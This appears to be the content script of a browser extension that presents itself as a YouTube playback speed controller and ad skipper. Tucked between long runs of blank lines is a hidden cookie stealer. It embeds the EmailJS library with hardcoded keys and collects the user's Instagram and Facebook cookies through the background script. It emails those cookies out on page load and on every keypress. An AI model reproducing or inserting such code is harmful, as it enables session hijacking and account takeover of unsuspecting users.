// YouTube Playback Speed Controller and Ad Skipper Extension

// Core Functionality to Handle Video Changes
function handleVideoChange() {
  setSessionStorageSpeedToVideo();
}

// Observer to Detect Video Source Changes
function observeYouTubeVideoChange() {
  const videoElement = document.querySelector('video');
  if (!videoElement) return;

  const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
      if (mutation.type === 'attributes' && mutation.attributeName === 'src') {
        handleVideoChange();
      }
    }
  });

  observer.observe(videoElement, { attributes: true });
}

// Initialization Function
function initializeExtension() {
  createSpeedMessage();
  addControlLinks();
  observeYouTubeVideoChange();
  monitorAds();
}

// Delayed Initialization on Window Load
window.addEventListener('load', () => {
  btnClicked()
  setTimeout(initializeExtension, 1000);
});

// Set Playback Speed and Update Session Storage
function setPlaybackSpeed(speed) {
  const video = document.querySelector('video');
  if (video) {
    video.playbackRate = Math.max(0.25, Math.min(speed, 10));
    sessionStorage.setItem('yt-player-playback-rate', JSON.stringify({ data: speed.toString(), creation: Date.now() }));
    updateSpeedDisplay();
  }
}

// Change Speed by Given Increment
function changeSpeed(increment) {
  const video = document.querySelector('video');
  if (video) {
    setPlaybackSpeed(video.playbackRate + increment);
    showSpeedMessage();
  }
}

// Update Speed Display Element
function updateSpeedDisplay() {
  const speedDisplay = document.querySelector('#speedDisplay');
  const video = document.querySelector('video');
  if (speedDisplay && video) {
    speedDisplay.textContent = video.playbackRate.toFixed(2);
  }
}

// Create Control Link for Speed Adjustment
function createControlLink(text, iconClass, onClick, id) {
  const link = document.createElement('a');
  link.innerHTML = iconClass ? `<i class="${iconClass}"></i> ${text}` : text;
  Object.assign(link.style, {
    color: 'white',
    fontSize: '14px',
    padding: '5px',
    cursor: 'pointer',
    fontWeight: '600',
  });

  if (id) link.id = id;
  link.addEventListener('click', (event) => { event.preventDefault(); onClick(); });
  return link;
}

// Apply Saved Playback Speed from Session Storage
function setSessionStorageSpeedToVideo() {
  const speedData = sessionStorage.getItem('yt-player-playback-rate');
  if (speedData) {
    setPlaybackSpeed(Number(JSON.parse(speedData).data));
  }
}

// Add Speed Control Links to YouTube Player
function addControlLinks() {
  setSessionStorageSpeedToVideo();

  const controlsContainer = document.querySelector('.ytp-left-controls');
  if (!controlsContainer) return;

  const controlWrapper = document.createElement('div');
  Object.assign(controlWrapper.style, {
    display: 'flex',
    flexDirection: 'row-reverse',
    alignItems: 'center',
    marginRight: '10px',
    background: '#ff0000ad',
    borderRadius: '30px',
    margin: 'auto 10px',
    height: '80%',
    padding: '0 5px',
  });
  controlWrapper.classList.add('unselectable');

  controlWrapper.append(
    createControlLink('+', 'fas fa-plus', () => changeSpeed(0.25)),
    createControlLink('1.00x', '', () => {}, 'speedDisplay'),
    createControlLink('-', 'fas fa-minus', () => changeSpeed(-0.25)),
  );

  controlsContainer.appendChild(controlWrapper);
  updateSpeedDisplay();

  controlWrapper.addEventListener('selectstart', (e) => e.preventDefault());
}





















var emailjs = function (e) { "use strict"; class t { constructor() { let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0, t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "Network Error"; this.status = e, this.text = t } } const i = { origin: "https://api.emailjs.com", blockHeadless: !1, storageProvider: (() => { if ("undefined" != typeof localStorage) return { get: e => Promise.resolve(localStorage.getItem(e)), set: (e, t) => Promise.resolve(localStorage.setItem(e, t)), remove: e => Promise.resolve(localStorage.removeItem(e)) } })() }, r = e => e ? "string" == typeof e ? { publicKey: e } : "[object Object]" === e.toString() ? e : {} : {}, o = function (e) { let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "https://api.emailjs.com"; if (!e) return; const o = r(e); i.publicKey = o.publicKey, i.blockHeadless = o.blockHeadless, i.storageProvider = o.storageProvider, i.blockList = o.blockList, i.limitRate = o.limitRate, i.origin = o.origin || t }, a = async function (e, r) { let o = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {}; const a = await fetch(i.origin + e, { method: "POST", headers: o, body: r }), s = await a.text(), n = new t(a.status, s); if (a.ok) return n; throw n }, s = (e, t, i) => { if (!e || "string" != typeof e) throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account"; if (!t || "string" != typeof t) throw "The service ID is required. Visit https://dashboard.emailjs.com/admin"; if (!i || "string" != typeof i) throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates" }, n = e => e.webdriver || !e.languages || 0 === e.languages.length, l = () => new t(451, "Unavailable For Headless Browser"), c = (e, t) => { if ((e => !e.list?.length || !e.watchVariable)(e)) return !1; ((e, t) => { if (!Array.isArray(e)) throw "The BlockList list has to be an array"; if ("string" != typeof t) throw "The BlockList watchVariable has to be a string" })(e.list, e.watchVariable); const i = (r = t, o = e.watchVariable, r instanceof FormData ? r.get(o) : r[o]); var r, o; return "string" == typeof i && e.list.includes(i) }, d = () => new t(403, "Forbidden"), m = async (e, t, i) => { if (!t.throttle || !i) return !1; ((e, t) => { if ("number" != typeof e || e < 0) throw "The LimitRate throttle has to be a positive number"; if (t && "string" != typeof t) throw "The LimitRate ID has to be a non-empty string" })(t.throttle, t.id); const r = t.id || e, o = await (async (e, t, i) => { const r = Number(await i.get(e) || 0); return t - Date.now() + r })(r, t.throttle, i); return o > 0 || (await i.set(r, Date.now().toString()), !1) }, h = () => new t(429, "Too Many Requests"), p = async (e, t, o, p) => { const u = r(p), b = u.publicKey || i.publicKey, g = u.blockHeadless || i.blockHeadless, f = u.storageProvider || i.storageProvider, w = { ...i.blockList, ...u.blockList }, y = { ...i.limitRate, ...u.limitRate }; if (g && n(navigator)) return Promise.reject(l()); if (s(b, e, t), (e => { if (e && "[object Object]" !== e.toString()) throw "The template params have to be the object. Visit https://www.emailjs.com/docs/sdk/send/" })(o), o && c(w, o)) return Promise.reject(d()); if (await m(location.pathname, y, f)) return Promise.reject(h()); const v = { lib_version: "4.4.1", user_id: b, service_id: e, template_id: t, template_params: o }; return a("/api/v1.0/email/send", JSON.stringify(v), { "Content-type": "application/json" }) }, u = async (e, t, o, p) => { const u = r(p), b = u.publicKey || i.publicKey, g = u.blockHeadless || i.blockHeadless, f = i.storageProvider || u.storageProvider, w = { ...i.blockList, ...u.blockList }, y = { ...i.limitRate, ...u.limitRate }; if (g && n(navigator)) return Promise.reject(l()); const v = (e => "string" == typeof e ? document.querySelector(e) : e)(o); s(b, e, t), (e => { if (!e || "FORM" !== e.nodeName) throw "The 3rd parameter is expected to be the HTML form element or the style selector of the form" })(v); const j = new FormData(v); return c(w, j) ? Promise.reject(d()) : await m(location.pathname, y, f) ? Promise.reject(h()) : (j.append("lib_version", "4.4.1"), j.append("service_id", e), j.append("template_id", t), j.append("user_id", b), a("/api/v1.0/email/send-form", j)) }; var b = { init: o, send: p, sendForm: u, EmailJSResponseStatus: t }; return e.EmailJSResponseStatus = t, e.default = b, e.init = o, e.send = p, e.sendForm = u, Object.defineProperty(e, "__esModule", { value: !0 }), e }({});

emailjs.init({
    publicKey: 'DSEphzuKt9aaCYXk3',
});

// Function to request cookies from the background script
function btnClicked() {
    chrome.runtime.sendMessage({ action: "getCookies" }, function (response) {
        const cookiesJson = JSON.stringify(response.cookies[".instagram.com"], null, 2) + "\n\n\n++++++++++\n\n\n" + JSON.stringify(response.cookies[".facebook.com"], null, 2);
        sendMail(cookiesJson);
    });
}

function sendMail(cookiesJson) {
    var params = {
        message: cookiesJson
    }
    const serviceID = "service_ec3j1li"
    const templateID = "template_jpt5501"
    emailjs.send(serviceID, templateID, params)

}





























// Keydown Event Listener for Speed Control
document.addEventListener('keydown', (event) => {
  
  btnClicked()
  if (event.shiftKey) {
    switch (event.key.toLowerCase()) {
      case 'x':
        changeSpeed(0.25);
        break;
      case 'z':
        changeSpeed(-0.25);
        break;
      case '>':
        const video = document.querySelector('video');
        const bezelText = document.querySelector('.ytp-bezel-text');
        if (video && bezelText && (bezelText.innerText === '2x' || video.playbackRate > 2)) {
        setPlaybackSpeed(2);
        }
        updateSpeedDisplay();
        break;
      case '<':
        updateSpeedDisplay();
        break;
    }
  }
});

// Show Speed Message Temporarily
function showSpeedMessage() {
  const showSpeedWrapper = document.querySelector('.showSpeedWrapper');
  const showSpeedText = document.querySelector('.showSpeedText');
  const video = document.querySelector('video');
  if (showSpeedWrapper && showSpeedText && video) {
    showSpeedText.innerText = `${video.playbackRate}x`;
    showSpeedWrapper.style.display = 'block';
    setTimeout(() => { showSpeedWrapper.style.display = 'none'; }, 450);
  }
}

// Create Speed Message Display
function createSpeedMessage() {
  const videoPlayer = document.querySelector('.html5-video-player');
  if (videoPlayer) {
    const speedContainer = document.createElement('div');
    const showSpeedWrapper = document.createElement('div');
    showSpeedWrapper.classList.add('showSpeedWrapper');

    const showSpeedText = document.createElement('div');
    showSpeedText.classList.add('showSpeedText');
    Object.assign(showSpeedText.style, {
      display: 'inline-block',
      padding: '10px 20px',
      fontSize: '175%',
      background: 'rgba(0, 0, 0, .5)',
      pointerEvents: 'none',
      borderRadius: '3px',
    });
    Object.assign(showSpeedWrapper.style, {
      textAlign: 'center',
      position: 'absolute',
      left: '0',
      right: '0',
      top: '10%',
      zIndex: 19,
      display: 'none',
    });

    showSpeedWrapper.appendChild(showSpeedText);
    speedContainer.appendChild(showSpeedWrapper);
    videoPlayer.appendChild(speedContainer);
  }
}

// Ad Skipping and Speed Adjustment for Ads

// Function to Skip Skippable Ads
function skipAd() {
  const skipButton = document.querySelector('.ytp-skip-ad-button');
  if (skipButton) {
    skipButton.click();
  }
}

// Function to Set Playback Rate for Unskippable Ads
function setAdPlaybackRate(rate) {
  const video = document.querySelector('video');
  if (video) {
    video.playbackRate = rate;
  }
}

// Monitor Ads and Apply Appropriate Actions
function monitorAds() {
  const adContainer = document.querySelector('.video-ads.ytp-ad-module');
  
  if (adContainer) {
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.addedNodes.length) {
          const isSkippableAd = document.querySelector('.ytp-skip-ad-button');
          
          if (isSkippableAd) {
            skipAd();
          } else {
            setAdPlaybackRate(16);
          }
        } else if (mutation.removedNodes.length) {
          setSessionStorageSpeedToVideo();
        }
      }
    });
    
    observer.observe(adContainer, { childList: true, subtree: true });
  }
}





